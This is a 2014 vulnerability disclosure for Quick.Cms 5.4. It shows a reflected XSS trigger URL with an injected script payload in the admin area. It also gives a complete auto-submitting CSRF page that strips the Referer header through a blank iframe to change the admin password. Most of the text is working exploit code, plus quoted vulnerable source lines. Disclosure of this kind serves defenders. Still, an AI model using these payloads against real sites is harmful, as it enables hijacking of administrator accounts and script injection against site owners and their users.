# Date: 04/08/2014
# Author: shpendk
# Software Link: http://opensolution.org/download,en,18.html?sFile=Quick.Cms/Quick.Cms_v5.4.zip
# Version: 5.4
# Tested on: Xampp on Windows
 
 
 
Reflected XSS Vulnerability in Admin Area:
 
Trigger: http://localhost/quickcms/admin.php/123&#039;;alert(123);//abc?p=pages-form&iPage=14
 
 
Vulnerable code: in /quickcms/templates/admin/pages-form.php:
 
144:             <script type="text/javascript">
145:                   var sPhpSelf = &#039;<?php echo $_SERVER[&#039;PHP_SELF&#039;]; ?>&#039;;...
 
poc: anything&#039;;alert(123);//
 
 
 
 
Admin password change csrf:
 
<html>
<head>
<script>
function load() {
    var postdata = &#039;<form id=dynForm method=POST action=\&#039;http://localhost/admin.php?p=tools-config\&#039;>&#039; +
                    &#039;<input type=hidden name=sOption value=save login=admin />&#039; +
                    &#039;<input type=hidden name=pass value=admin1234 />&#039; +
                    &#039;</form>&#039;;
    top.frames[0].document.body.innerHTML=postdata;
    top.frames[0].document.getElementById(&#039;dynForm&#039;).submit();
}
</script>
</head>
<body onload="load()">
 
<iframe src="about:blank" id="noreferer"></iframe>
 
 
</body>
</html>
 
 
Vulnerable code:
60: if( ( strstr( $p, &#039;-delete&#039; ) || count( $_POST ) > 0 ) && !empty( $_SERVER[&#039;HTTP_REFERER&#039;] ) && !strstr( $_SERVER[&#039;HTTP_REFERER&#039;], $_SERVER[&#039;SCRIPT_NAME&#039;] ) ){
61:  header( &#039;Location: &#039;.$_SERVER[&#039;PHP_SELF&#039;].&#039;?p=error&#039; );
62:  exit;
}
 
Explanation:
 
http://webstersprodigy.net/2013/02/01/stripping-the-referer-in-a-cross-domain-post-request/

